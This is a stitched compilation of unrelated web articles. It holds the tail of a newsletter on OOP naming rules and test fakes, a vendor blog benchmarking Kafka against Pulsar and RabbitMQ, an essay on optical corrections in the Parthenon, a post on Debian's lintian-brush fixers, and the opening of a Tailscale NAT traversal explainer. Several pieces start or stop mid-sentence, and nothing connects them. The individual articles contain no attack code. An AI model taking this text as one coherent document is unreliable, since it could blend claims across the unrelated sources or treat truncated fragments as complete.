																		<p><em>First, Chapter 8 suggested that you put domain behavior on instances. This class violates that rule; its behavior is on the class/static side.</em></p>

																		<p><em>Next, there's an as-yet-unmentioned object-oriented programming rule that prohibits the use of pattern names in class names. The word "Fake" above refers to a testing pattern, so naming this class <code>VerseFake</code> violates that rule.</em></p>

																		<p><em>Fake things first. You're probably familiar with the idea of design patterns, which are named, re-usable solutions to common software problems. Pattern names act as shortcuts to big ideas and allow programmers to communicate with speed and precision. Pattern thinking has so influenced software design that most programmers are familiar with a number of patterns. For example, you've likely heard of Decorator, Adapter, Enumerator, and so on, even if you're a bit fuzzy on the specifics of some of their definitions.</em></p>

																		<p><em>Since pattern names are so meaningful, it can be tempting to stick them in class names. For example, you might use the Decorator pattern to enclose a <code>number</code> in a new class that adds additional responsibility. Initially, <code>NumberDecorator</code> might seem like a good name for the result. The problem with including the name of a pattern in the name of a class is that this permits you the feeling of having created a useful name without actually having done so. Pattern names don't generally reflect concepts in your application. Appending them to class names pollutes your domain with programmer-y words and circumvents the search for names that add semantic meaning. Class names that include patterns are a signal that you've given up too soon on the hard problem of naming.</em></p>

																		<p><em>Class names should reflect concepts in your domain, not the patterns used to create them. Compared to <code>BottleNumber</code>, the much-richer name you gave this class in Chapter 4, <code>NumberDecorator</code> is so abstract as to be meaningless. Future readers won't care that the class was created using Decoration but they'll be grateful to know that it's a bottle-ish kind of number.</em></p>

																		<p><em>The <a href="https://sender.cloudy.email/postal/click?link=92414&amp;sid=wgborfbdgjegdfcirfkho&amp;ck=77-9A--_ve-_vQXvv70_77-9Lm5277-9FmIS77-977-977-977-9SlVwE--_vUTvv71XyqXvv73vv70=" target="_blank">xUnit Test Patterns</a> book by <a href="https://sender.cloudy.email/postal/click?link=92415&amp;sid=wgborfbdgjegdfcirfkho&amp;ck=MhLvv73vv71JFe-_vVLvv73vv73vv71iVO-_vU8QKu-_vVRoLu-_vXrvv70j77-9ae-_vVzvv70y77-9" target="_blank">Gerard Meszaros</a> standardizes the <a href="https://sender.cloudy.email/postal/click?link=92416&amp;sid=wgborfbdgjegdfcirfkho&amp;ck=Ze-_vUDvv73vv71FCO-_ve-_vWPvv70rQu-_vRzvv73vv70Q77-977-977-9M--_vUUzNe-_vVPvv70=" target="_blank">pattern names</a> of a set of objects that are used to simplify testing. <code>TestDouble</code> is his generic name for all of the patterns. Within <code>TestDouble</code> he further delineates the <code>Dummy</code>, <code>Stub</code>, <code>Spy</code>, <code>Mock</code>, <code>Fake</code>, and <code>Temporary Test Stub</code> patterns.</em></p>

																		<p><em>Meszaros defines <code>Fake</code> as a <code>TestDouble</code> that provides a lightweight implementation of a collaborator that is needed by the class you are actually unit testing. A <code>Fake</code> is a regular old object; no testing magic is involved. In this case the new <code>VerseFake</code> class is a real player of the verse template role; it's called a <code>Fake</code> because it's only used during testing. <code>BottleVerse</code> plays the role of verse template in production. <code>VerseFake</code> was created to play this role during <code>Bottles</code>' unit tests.</em></p>

																		<p><em>The upshot is that <code>Fake</code> is the name of a pattern, so <code>VerseFake</code> violates the don't-include-pattern-names-in-class-names rule.</em></p>

																		<p><em>Rules exist to save money, and the two rules that <code>VerseFake</code> breaks are primarily meant to save money in production code; they might not be so applicable in code created to simplify tests. For example, the purpose of <code>VerseFake</code> is to fake the role of verse template. In this case, <code>VerseFake</code> might be the most intention-revealing name possible. If you end up needing a number of different kinds of fakes, you might need additional qualifiers in their names (<code>SimpleVerseFake</code>, <code>ComplicatedVerseFake</code>) but the word "fake" still adds meaning in the domain of your tests.</em></p>

																		<p><em>Similarly, it's important that the shape of production code not interfere with your ability to change it. The put-domain-behavior-on-instances rule serves this goal. In tests, however, you're less concerned with preserving the fake's changeability and more interested in directly communicating its responsibilities. Putting the behavior in a class or static method simplifies the code in <code>VerseFake</code> at the expense of making it less adaptable. This is a trade-off you'll happily make in code used only by the tests.</em></p>
																		</blockquote>

																		<p>I am convinced by that explanation, and I hope you are too. Now that I comprehend it, the no-pattern-names-in-class-names rule seems both simple and inevitable.</p>

																		<p>The deeper point is that I didn't really understand this rule until I had to write an explanation—believe me, my early attempts were neither brief nor convincing. The above is the result of a few days of walking around in my office, muttering, groping for insight.</p>

																		<p>It's not necessarily bad to cargo-cult a rule. Most rules that have risen to the level of cargo-cult-ability are actually pretty reasonable, and even if you don't completely understand their subtleties, following them might improve your code.</p>

																		<p>However, you'll get more value from a rule if you comprehend its underlying purpose. And even better, understanding its true purpose allows you to justify yourself when you decide to break it.</p>

																		<p>Thanks for reading. I very much hope you are safe and well.</p>

																		<p>Best,</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Apache Kafka<sup>®</sup> is one of the most popular event streaming systems. There are many ways to <a href="https://www.confluent.io/kafka-vs-pulsar/">compare systems</a> in this space, but one thing everyone cares about is performance. Kafka has been known to be <a href="https://engineering.linkedin.com/kafka/benchmarking-apache-kafka-2-million-writes-second-three-cheap-machines" target="_blank" rel="noopener noreferrer">fast</a>, but how fast is it today, and how does it stack up against other systems? We decided to test Kafka’s performance on the latest cloud hardware to find out.</p>
<p>For comparisons, we chose a traditional message broker, <a href="https://www.rabbitmq.com/" target="_blank" rel="noopener noreferrer">RabbitMQ</a>, and one of the <a href="https://bookkeeper.apache.org/" target="_blank" rel="noopener noreferrer">Apache BookKeeper™</a>&nbsp;based message brokers, <a href="http://pulsar.apache.org/" target="_blank" rel="noopener noreferrer">Apache Pulsar</a>. We focused on (1) <strong>system throughput</strong> and (2) <strong>system latency</strong>, as these are the primary performance metrics for event streaming systems in production. In particular, the throughput test measures how efficient each system is in utilizing the hardware, specifically the disks and the CPU. The latency test measures how close each system is to delivering real-time messaging including tail latencies of up to p99.9th percentile, a key requirement for real-time and mission-critical applications as well as microservices architectures.</p>
<p>We found that Kafka delivers the best throughput while providing the lowest end-to-end latencies up to the p99.9th percentile. At lower throughputs, RabbitMQ delivers messages at very low latencies.</p>

<p>This blog post is structured to first walk you through the benchmarking framework we used, followed by a description of the testbed and the workloads. It will finish with an explanation of the results using the various system and application metrics. All of these are <a href="https://github.com/confluentinc/openmessaging-benchmark/" target="_blank" rel="noopener noreferrer">open source</a>, so curious readers can reproduce the results for themselves or dig deeper into the collected Prometheus metrics. As with most benchmarks, we compare performance on a setup for a specific workload. We always encourage readers to compare using their own workloads/setups, to understand how these translate to production deployments.

<h2 id="background"><a id="background"></a>Background</h2>
<p>First, let’s discuss each of the systems briefly to understand their high-level design and architecture, looking at the trade-offs each system makes.</p>
<p><strong>Kafka</strong> is an open-source distributed event streaming platform, and one of the five most active projects of the Apache Software Foundation. At its core, Kafka is designed as a replicated, distributed, persistent commit log that is used to power event-driven microservices or large-scale stream processing applications. Clients produce or consume events directly to/from a cluster of brokers, which read/write events durably to the underlying file system and also automatically replicate the events synchronously or asynchronously within the cluster for fault tolerance and high availability.</p>
<p><strong>Pulsar</strong> is an open-source distributed pub/sub messaging system originally catered towards queuing use cases. It recently added event streaming functionality as well. Pulsar is designed as a tier of (almost) stateless broker instances that connect to a separate tier of BookKeeper instances, which actually read/write and, optionally, store/replicate the messages durably. Pulsar is not the only system of its kind as there are also other messaging systems like Apache DistributedLog and Pravega, which have been created on top of BookKeeper and aim to also provide some Kafka-like event streaming functionality.</p>
<p><strong>BookKeeper</strong> is an open-source distributed storage service that was originally designed as a write-ahead log for Apache™ Hadoop®’s NameNode. It provides persistent storage of messages in <em>ledgers</em>, across server instances called <em>bookies</em>. Each bookie synchronously writes each message to a local journal log for recovery purposes and then asynchronously into its local indexed ledger storage. Unlike Kafka brokers, bookies do not communicate with each other and it’s the BookKeeper clients that are responsible for replicating the messages across bookies using a quorum-style protocol.</p>
<p><strong>RabbitMQ</strong> is an open-source traditional messaging middleware that implements the AMQP messaging standard, catering to low-latency queuing use cases. RabbitMQ consists of a set of broker processes that host “exchanges” for publishing messages to and queues for consuming messages from. Availability and durability are properties of the various queue types offered. Classic queues offer the least availability guarantees. Classic mirrored queues replicate messages to other brokers and improve availability. Stronger durability is provided through the more recently introduced <a href="https://www.rabbitmq.com/quorum-queues.html" target="_blank" rel="noopener noreferrer">quorum queues</a> but at the <a href="https://www.rabbitmq.com/quorum-queues.html#use-cases" target="_blank" rel="noopener noreferrer">cost of performance</a>. Since this is a performance-oriented blog post, we restricted our evaluation to classic and mirrored queues.</p>
<h2 id="durability"><a id="durability"></a>Durability in distributed systems</h2>
<p>Single-node storage systems (e.g., RDBMS) depend on fsyncing writes to disk to ensure maximal durability. But in distributed systems, durability typically comes from replication, with multiple copies of the data that fail independently. Fsyncing data is just a way of reducing the impact of the failure when it does occur (e.g., fsyncing more often could lead to lower recovery time). Conversely, if enough replicas fail, a distributed system may be unusable regardless of fsync or not. Hence, whether we fsync or not is just a matter of what guarantees each system chooses to depend on for its replication design. While some depend closely on never losing data written to disk, thus requiring fsync on every write, others handle this scenario in their design.</p>
<p>Kafka’s replication protocol was carefully designed to ensure consistency and durability guarantees without the need for synchronous fsync by tracking what has been fsynced to the disk and what hasn’t. By assuming less, Kafka can handle a wider range of failures like filesystem-level corruptions or accidental disk de-provisioning and does not take for granted the correctness of data that is not known to be fsync’d. Kafka is also able to leverage the OS for batching writes to the disk for better performance.</p>
<p>We have not been able to ascertain categorically whether BookKeeper offers the same consistency guarantees without fsyncing each write—specifically, whether it can rely on replication for fault tolerance in the absence of synchronous disk persistence. This isn’t covered in the documentation or a write-up on the underlying replication algorithm. Based on our inspection and the fact that BookKeeper implements a grouped fsync algorithm, we believe it does rely on fsyncing on each write for its correctness, but we’d love to <a href="mailto:info@confluent.io" target="_blank" rel="noopener noreferrer">hear from folks</a> in the community who might know better if our conclusion is correct.</p>
<p>In any case, since this can be somewhat of a controversial topic, we’ve given results in both cases to ensure we are being as fair and complete as possible, though running Kafka with synchronous fsync is extremely uncommon and also unnecessary.</p>
<h2 id="benchmarking-framework"><a id="benchmarking-framework"></a>Benchmarking framework</h2>
<p>With any benchmark, one wonders what framework is being used and if it’s fair. To that end, we wanted to use the <a href="http://openmessaging.cloud/docs/benchmarks/" target="_blank" rel="noopener noreferrer">OpenMessaging Benchmark Framework</a> (OMB), originally authored, in large parts, by Pulsar contributors. OMB was a good starting point with basic workload specification, metrics collection/reporting for the test results, support for the three chosen messaging systems as well as a modular cloud deployment workflow tailored for each system. But of note, Kafka and RabbitMQ implementations did have some significant shortcomings that affected the fairness and reproducibility of these tests. The resulting benchmarking code including the fixes described in more detail below are available as <a href="https://github.com/confluentinc/openmessaging-benchmark" target="_blank" rel="noopener noreferrer">open source</a>.</p>
<h3 id="omb-framework"><a id="omb-framework"></a>Fixes to the OMB Framework</h3>
<p>We upgraded to Java 11 and Kafka 2.6, RabbitMQ 3.8.5, and Pulsar 2.6 (the latest releases at the time of writing). We significantly enhanced the monitoring capabilities across the three systems, with the Grafana/Prometheus monitoring stack, capturing metrics across messaging systems, JVM, Linux, disk, CPU, and network. This was critical for being able to not just report results but explain them. We have added support for producer-only tests and consumer-only tests with support for generating/draining backlogs, while also fixing an important bug with producer rate calculation when the number of topics is smaller than the number of producer workers.</p>
<h3 id="omb-kafka-driver"><a id="omb-kafka-driver"></a>Fixes to the OMB Kafka driver</h3>
<p>We fixed a critical bug in the Kafka driver that starved Kafka producers of TCP connections, bottlenecking on a single connection from each worker instance. The fix makes the Kafka numbers fair, compared to other systems—that is, all of them now use the same number of TCP connections to talk to their respective brokers. We also fixed a critical bug in the Kafka benchmark consumer driver, where offsets were being committed too frequently and synchronously causing degradation, whereas it was done asynchronously for other systems. We also tuned the Kafka consumer fetch size and replication threads to eliminate bottlenecks in message fetching at high throughputs and to configure the brokers equivalent to the other systems.</p>
<h3 id="omb-rabbitmq-driver"><a id="omb-rabbitmq-driver"></a>Fixes to the OMB RabbitMQ driver</h3>
<p>We enhanced RabbitMQ to use routing keys and configurable exchange types (<code>DIRECT</code> and <code>TOPIC</code> exchanges) and also fixed a bug in the RabbitMQ cluster setup deployment workflow. Routing keys were introduced to mimic the concept of partitions per …</p></div></div></div>

<td>Ancient Greek architects counteracted the deformity that comes with visual perspective. Objects appear smaller as they are farther away, and as Greek temples were “buildings in which merits and faults usually last forever” <sup id="cite_ref-1"><a title="" href="#cite_note-1">1</a></sup> it was important that all parts be seen in their correct size.An ideal building would be seen as a whole object, with parts that fit perfectly. Unless it displays correct proportions, “there can be no principles in the design of any temple; that is, if there is no precise relation between its members.” <sup id="cite_ref-2"><a title="" href="#cite_note-2">2</a></sup>
<p>Greek and Roman builders sought to “counteract the ocular deception by an adjustment of proportions.” <sup id="cite_ref-3"><a title="" href="#cite_note-3">3</a></sup> Objects farther away were enlarged so that they matched the objects around them. Architects adjusted proportions so that the temple would appear correct when viewed a distance six times the height of a column. This precise viewing distance related the viewer to the architecture and made him part of it.<br>
&nbsp;</p>
<h2><span id="tilt">Tilt to Fix Perspective</span></h2>
<p>&nbsp;<br>
The Roman architect Vitruvius said that all parts above the column of a Doric building should be tilted downward so that they would appear to be vertical when viewed from below. If viewed from afar, these tilted elements would appear flush.</p>

<blockquote><p>“All the members which are to be above the capitals of the columns, that is, architraves, friezes, coronae, tympana, gables, and acroteria, should be inclined to the front a twelfth part of their own height, for the reason that when we stand in front of them, if two lines are drawn from the eye, one reaching to the bottom of the building and the other to the top, that which reaches to the top will be the longer. Hence, as the line of sight to the upper part is the longer, it makes that part look as if it were leaning back. But when the members are inclined to the front, as described above, they will seem to the beholder to be plumb and perpendicular.” <sup id="cite_ref-4"><a title="" href="#cite_note-4">4</a></sup></p></blockquote>

<h2><span id="distance">View Correctly From A Certain Distance</span></h2>
<p>&nbsp;<br>
Why a tilt of 1/12? The roof eave overhang was usually about 1/12th the height of the column (for example, the Temple of Athena at Priene). This was deliberately the same proportion as the entablature tilt, so that it would relate each element of the entablature with the columns below.</p>
<div><p>If we form an equilateral triangle from the tilt of the columns and overhang, we discover that this plane appears flush to someone standing back six times the height of the columns. This point of the triangle will be at eye height, just the right point from which to view the building. To someone standing at this distance, the roof eave will appear the same distance away as the base of the column.<br>
<a href="https://lh4.googleusercontent.com/-jhVJIBBArwE/UtgO_6W0ndI/AAAAAAAACXY/4KC-I2696S0/s0/Ionic%2520measurements.jpg"><img src="https://lh4.googleusercontent.com/-jhVJIBBArwE/UtgO_6W0ndI/AAAAAAAACXY/4KC-I2696S0/s700/Ionic%2520measurements.jpg" alt=""></a></p><p>
&nbsp;
It also creates an angle of ten degrees. The numbers six and ten, Vitruvius said, are the best numbers to use because they are related to most other numbers.</p></div>
<p>The Parthenon has columns of 10.45m height and the overhang is less than 1m. It will therefore be viewed with perfect proportions at a distance of about 60m or 200ft.</p>
<p>This provided precise points on the surrounding topography that related to the building, engaged the landscape, and makes the viewer an active participant. An important function of these buildings was to relate of the human body with the temple, finding the “calculated proportions that could be applied to the human body and temples alike.” <sup id="cite_ref-6"><a title="" href="#cite_note-6">6</a></sup> “Since nature has designed the human body so that its members are duly proportioned to the frame as a whole, it appears that the ancients had good reason for their rule, that in perfect buildings the different members must be in exact symmetrical relations to the whole general scheme.” <sup id="cite_ref-5"><a title="" href="#cite_note-5">5</a></sup></p>
<p>Temples don’t just reference the viewer’s body and the outlaying topography- it directly interacts with them, giving explanation for the design of the body and finding its place in the natural landscape.<br>
&nbsp;</p>
<h2><span id="incline">Incline Columns Inward</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-d5OPNxDdIvU/UtWyFAi6RdI/AAAAAAAACUg/zMr9rvraoLo/s0/6%2520Columns%2520inclined%2520inward.jpg"><img src="https://lh4.googleusercontent.com/-d5OPNxDdIvU/UtWyFAi6RdI/AAAAAAAACUg/zMr9rvraoLo/s300/6%2520Columns%2520inclined%2520inward.jpg" width="40%" alt=""></a><br>
The facade elements are tilted outward, but the columns are actually tilted inward. This emphasizes their ability to hold up the ceiling. Vertical columns under the heavy weight of the entablature appear like they are about to tip over toward the viewer, but an inward tilt to the columns make them look more stable when viewed from below. This gives “the whole building an appearance of greater strength.” <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup></p>
<p>In this case Greek architects did not seek to counteract perspective distortion but to use it to their advantage. This “imposing effect of high relief” suggests structural stability, something more important than strict proportion. This inclination is very subtle; on the Parthenon the columns lean inward just 2 3/8 inches. The tilted axis of these columns converge 1 1/2 miles into the sky. <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup><br>
&nbsp;</p>
<h2><span id="floor">Curved Floor</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-_TLkgrTunkY/UtW9BX9Fl-I/AAAAAAAACU4/a9tA2iSq4Gc/s0/7%2520Curved%2520stylobate.jpg"><img src="https://lh4.googleusercontent.com/-_TLkgrTunkY/UtW9BX9Fl-I/AAAAAAAACU4/a9tA2iSq4Gc/s300/7%2520Curved%2520stylobate.jpg" width="40%" alt=""></a>The stylobate floor of the Parthenon is curved upward. A perfectly flat floor would appear to sag inward. The face of the earth is curved and the hill on which the Parthenon stands is curved, therefore viewers instinctively expect a slight curvature to all horizontal planes. Straight edges look off.</p>
<p>“This horizontal curvature actually begins not in the stylobate, but below the stylobate in the foundations. But the curvature is most noticeable in the stylobate, which directly receives the downward thrust of the column drums.” <sup id="cite_ref-8"><a title="" href="#cite_note-8">8</a></sup></p>
<p>The curve reaches 2 3/8 inches on the end facades and 4 5/16 inches on the long facades, a radius of 3 1/2 miles. <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup><br>
&nbsp;</p>
<h2><span id="spacing">Column Spacing</span></h2>
<p>&nbsp;<br>
<a href="https://lh6.googleusercontent.com/-TXUoPKe8oAw/UtW-znV6pfI/AAAAAAAACVQ/8JL2BpmNiJ4/s0/8%2520Column%2520spacing%2520contracted.jpg"><img src="https://lh6.googleusercontent.com/-TXUoPKe8oAw/UtW-znV6pfI/AAAAAAAACVQ/8JL2BpmNiJ4/s300/8%2520Column%2520spacing%2520contracted.jpg" width="40%" alt=""></a><br>
In perspective, the distance between columns normally appear smaller as they proceed toward a <a href="http://www.architecturerevived.com/how-to-find-vanishing-points-in-perspective-drawing/">vanishing point</a> in the distance. But the Parthenon has more robust columns and greater spacing between them at the ends. When viewed from a distance the spacing and size appear equal.</p>
<p>Along with proportions, this also makes the structure appear more stable. “Hence in the Parthenon, the spacing between each corner column and the column next to it is less than the space between other columns, and this gives a feeling of extra support at points of extra stress.” <sup id="cite_ref-9"><a title="" href="#cite_note-9">9</a></sup><br>
&nbsp;</p>
<h2><span id="entasis">Column Shafts Swell Out</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-_BsUpQkhkXY/UtXBlCfWXNI/AAAAAAAACVw/QI67iJOJalI/s0/9%2520Column%2520entasis%2520Fra%2520Giocondo%2520vitruvius.jpg"><img src="https://lh4.googleusercontent.com/-_BsUpQkhkXY/UtXBlCfWXNI/AAAAAAAACVw/QI67iJOJalI/s300/9%2520Column%2520entasis%2520Fra%2520Giocondo%2520vitruvius.jpg" width="40%" alt=""></a><br>
The shafts of the columns swell slightly outward. This counteracts a feeling of slenderness that results from visual perspective, much as with the case of the curved floor. A swollen column appears more robust and strong than a straight shaft.</p>
<p>Vitruvius prescribed different “proportionate enlargements” depending on the height of the columns. Taller columns require greater enlargement because perspective causes more distortion on them, he reasons. <sup id="cite_ref-10"><a title="" href="#cite_note-10">10</a></sup><br>
&nbsp;</p>
<h2><span id="goldenmean">Golden Proportion</span></h2>

<p><a href="https://lh3.googleusercontent.com/-UGli92vOf7s/UtXCCyZ2qzI/AAAAAAAACV8/44u7F5HCtzg/s0/4%2520Parthenon%2520measurements%2520golden%2520mean.jpg"><img src="https://lh3.googleusercontent.com/-UGli92vOf7s/UtXCCyZ2qzI/AAAAAAAACV8/44u7F5HCtzg/s0/4%2520Parthenon%2520measurements%2520golden%2520mean.jpg" width="100%" alt=""></a></p>
<p><a href="http://www.architecturerevived.com/golden-ratio-form-size-distance-in-space/">The Golden proportion</a> relates parts of an object. It allows the brain to distinguish size and distances of objects in perspective and thus recognize them as parts of a whole body. It comes as no surprise, therefore, that Greeks and Romans use this proportion extensively.</p>
<p>The increase in distance between the columns follows the golden proportion, so that the gap between columns is proportionate to the width of the column shafts. This proportion of positive and negative space allows the viewer’s brain to recognize the columns as part of the entire edifice, so that “the temple, viewed from a distance, compresses into an all but impenetrable volume that stands out in bold relief against its surroundings.” <sup id="cite_ref-11"><a title="" href="#cite_note-11">11</a></sup></p>
<p>In the Parthenon, the stylobates and metopes follow the same golden proportions as the columns. This gives the collonade a golden proportion of 3 columns versus 4 columns and the entire width of the facade a golden proportion. Golden proportion also dictates the column height versus the entablature, the same relationship of elements behind the outward tilt of the facade. The elements within the entablature, which tilt outward 1/12th all have golden proportions amongst themselves.</p>
<p>The <a href="http://miguelmartindesign.com/blog/wp-content/uploads/2011/01/figure7.jpg">golden mean was utilized</a> together with clever ocular corrections to give a sense of wholeness, relationship of parts. This scene of wholeness was achieved from certain views within the outlaying landscape, relating the viewer to the building and to the overall site. The viewer is thus engaged in the architecture.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div>

            <section>
                
            </section>
            <p>The <a href="https://jelmer.uk/debian-janitor.html">Debian Janitor</a> is an automated
system that commits fixes for (minor) issues in Debian packages that can be
fixed by software. It gradually started proposing merges in early
December. The first set of changes sent out ran <a href="https://salsa.debian.org/jelmer/lintian-brush">lintian-brush</a> on sid packages maintained in
Git. This post is part of <a href="https://jelmer.uk/tag/janitor-update.html">a series</a> about the progress of the
Janitor.</p>
<div id="scheduling-lintian-fixes">
<h2>Scheduling Lintian Fixes</h2>
<p>To determine which packages to process, the  <a href="https://janitor.debian.net/">Janitor</a>  looks at the import of  <a href="https://lintian.debian.org/">lintian</a>  output across the archive that is available
in  <a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a> <a href="#f1" id="id1">[1]</a>. It
will prioritize those packages with the most and more severe issues that it has
fixers for.</p>
<p>Once a package is selected, it will clone the packaging repository and run
<a href="https://manpages.debian.org/testing/lintian-brush/lintian-brush.1.en.html">lintian-brush</a>
on it.  Lintian-brush provides a framework for applying a set of “fixers” to a
package. It will run each of a set of “fixers” in a pristine version of the
repository, and handles most of the heavy lifting.</p>
</div>
<div id="the-inner-workings-of-a-fixer">
<h2>The Inner Workings of a Fixer</h2>
<p>Each fixer is just an executable which gets run in a clean
checkout of the package, and can make changes there. Most
of the fixers are written in Python or shell, but they
can be in any language.</p>
<p>The contract for fixers is pretty simple:</p>
<ul>
<li>If the fixer exits with non-zero, the changes are reverted and fixer is
considered to have failed</li>
<li>If exits with zero and made changes, then it should write a summary of its
changes to standard out</li>
</ul>
<p>If a fixer is uncertain about the changes it has made, it should report so on
standard output using a pseudo-header.  By default, lintian-brush will discard
any changes with uncertainty but if you are running it locally you can still
apply them by specifying <tt><span>--uncertain</span></tt>.</p>
<p>The summary message on standard out will be used for the commit message and
(possibly) the changelog message, if the package doesn’t use gbp dch.</p>
</div>
<div id="example-fixer">
<h2>Example Fixer</h2>
<p>Let’s look at an example. The package priority “extra” is deprecated since
Debian Policy 4.0.1 (released August 2 017) – see
<a href="https://www.debian.org/doc/debian-policy/ch-archive.html#priorities">Policy 2.5 "Priorities"</a>.
Instead, most packages should use the “optional” priority.</p>
<p>Lintian will warn when a package uses the deprecated “extra” value for the
“Priority”  - the associated tag is
<a href="https://lintian.debian.org/tags/priority-extra-is-replaced-by-priority-optional.html">priority-extra-is-replaced-by-priority-optional</a>.
Lintian-brush has a fixer script that can automatically replace “extra” with
“optional”.</p>
<p>On systems that have lintian-brush installed, the source for the fixer lives in
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/blob/master/fixers/priority-extra-is-replaced-by-priority-optional.py">/usr/share/lintian-brush/fixers/priority-extra-is-replaced-by-priority-optional.py</a>,

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>We covered a lot of ground in our post about <a href="https://tailscale.com/blog/how-tailscale-works/"><em>How Tailscale
Works</em></a>.  However, we glossed over how we can get through NATs
(Network Address Translators) and connect your devices directly to
each other, no matter what’s standing between them. Let’s talk about
that now!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-intro.png">
    
    
</figure>

<p>Let’s start with a simple problem: establishing a peer-to-peer
connection between two machines. In Tailscale’s case, we want to set
up a WireGuard® tunnel, but that doesn’t really matter. The
techniques we use are widely applicable and the work of many people
over decades. For example, <a href="https://webrtc.org/">WebRTC</a> uses this bag of tricks to
send peer-to-peer audio, video and data between web browsers. VoIP
phones and some video games use similar techniques, though not always
successfully.</p>
<p>We’ll be discussing these techniques generically, using Tailscale and
others for examples where appropriate. Let’s say you’re making your
own protocol and that you want NAT traversal. You need two things.</p>
<p>First, the protocol should be based on UDP. You <em>can</em> do NAT traversal
with TCP, but it adds another layer of complexity to an already quite
complex problem, and may even require kernel customizations depending
on how deep you want to go. We’re going to focus on UDP for the rest
of this article.</p>
<p>If you’re reaching for TCP because you want a stream-oriented
connection when the NAT traversal is done, consider using QUIC
instead. It builds on top of UDP, so we can focus on UDP for NAT
traversal and still have a nice stream protocol at the end.</p>
<p>Second, you need direct control over the network socket that’s sending
and receiving network packets. As a rule, you can’t take an existing
network library and make it traverse NATs, because you have to send
and receive extra packets that aren’t part of the “main” protocol
you’re trying to speak. Some protocols tightly integrate the NAT
traversal with the rest (e.g. WebRTC). But if you’re building your
own, it’s helpful to think of NAT traversal as a separate entity that
shares a socket with your main protocol. Both run in parallel, one
enabling the other.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-deep-integration.png">
    
    
</figure>

<p>Direct socket access may be tough depending on your situation. One
workaround is to run a local proxy. Your protocol speaks to this
proxy, and the proxy does both NAT traversal and relaying of your
packets to the peer. This layer of indirection lets you benefit from
NAT traversal without altering your original program.</p>
<p>With prerequisites out of the way, let’s go through NAT traversal from
first principles. Our goal is to get UDP packets flowing
bidirectionally between two devices, so that our other protocol
(WireGuard, QUIC, WebRTC, …) can do something cool. There are two
obstacles to having this Just Work: stateful firewalls and NAT
devices.</p>
<h3 id="figuring-out-firewalls">Figuring out firewalls</h3>
<p>Stateful firewalls are the simpler of our two problems. In fact, most
NAT devices include a stateful firewall, so we need to solve this
subset before we can tackle NATs.</p>
<p>There are many incarnations to consider. Some you might recognize are
the Windows Defender firewall, Ubuntu’s ufw (using iptables/nftables),
BSD’s pf (also used by macOS) and AWS’s Security Groups. They’re all
very configurable, but the most common configuration allows all
“outbound” connections and blocks all “inbound” connections. There
might be a few handpicked exceptions, such as allowing inbound SSH.</p>
<p>But connections and “direction” are a figment of the protocol
designer’s imagination. On the wire, every connection ends up being
bidirectional; it’s all individual packets flying back and forth. How
does the firewall know what’s inbound and what’s outbound?</p>
<p>That’s where the stateful part comes in. Stateful firewalls remember
what packets they’ve seen in the past and can use that knowledge when
deciding what to do with new packets that show up.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-1a.png">
    
    
</figure>

<p>For UDP, the rule is very simple: the firewall allows an inbound UDP
packet if it previously saw a matching outbound packet. For example,
if our laptop firewall sees a UDP packet leaving the laptop from
<code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, it’ll make a note that incoming
packets from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code> are also fine. The
trusted side of the world clearly intended to communicate with
<code>7.7.7.7:5678</code>, so we should let them talk back.</p>
<p>(As an aside, some <em>very</em> relaxed firewalls might allow traffic from
anywhere back to <code>2.2.2.2:1234</code> once <code>2.2.2.2:1234</code> has communicated
with anyone. Such firewalls make our traversal job easier, but are
increasingly rare.)</p>
<h4 id="firewall-face-off">Firewall face-off</h4>
<p>This rule for UDP traffic is only a minor problem for us, as long as
all the firewalls on the path are “facing” the same way. That’s
usually the case when you’re communicating with a server on the
internet. Our only constraint is that the machine that’s <em>behind</em> the
firewall(s) must be the one initiating all connections. Nothing can
talk to it, unless it talks first.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-2.png">
    
    
</figure>

<p>This is fine, but not very interesting: we’ve reinvented client/server
communication, where the server makes itself easily reachable to
clients. In the VPN world, this leads to a hub-and-spoke topology: the
hub has no firewalls blocking access to it and the firewalled spokes
connect to the hub.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-3.png">
    
    
</figure>

<p>The problems start when two of our “clients” want to talk
directly. Now the firewalls are facing each other. According to the
rule we established above, this means both sides must go first, but
also that neither can go first, because the other side has to go
first!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-4.png">
    
    
</figure>

<p>How do we get around this? One way would be to require users to
reconfigure one or both of the firewalls to “open a port” and allow
the other machine’s traffic. This is not very user friendly. It also
doesn’t scale to mesh networks like Tailscale, in which we expect the
peers to be moving around the internet with some regularity. And, of
course, in many cases you don’t have control over the firewalls: you
can’t reconfigure the router in your favorite coffee shop, or at the
airport. (At least, hopefully not!)</p>
<p>We need another option. One that doesn’t involve reconfiguring
firewalls.</p>
<h4 id="finessing-finicky-firewalls">Finessing finicky firewalls</h4>
<p>The trick is to carefully read the rule we established for our
stateful firewalls. For UDP, the rule is: <strong>packets must flow out
before packets can flow back in.</strong></p>
<p>However, nothing says the packets must be <em>related</em> to each other
beyond the IPs and ports lining up correctly. As long as <em>some</em> packet
flowed outwards with the right source and destination, any packet that
<em>looks like</em> a response will be allowed back in, even if the other
side never received your packet!</p>
<p>So, to traverse these multiple stateful firewalls, we need to share
some information to get underway: the peers have to know in advance
the <code>ip:port</code> their counterpart is using. One approach is to
statically configure each peer by hand, but this approach doesn’t
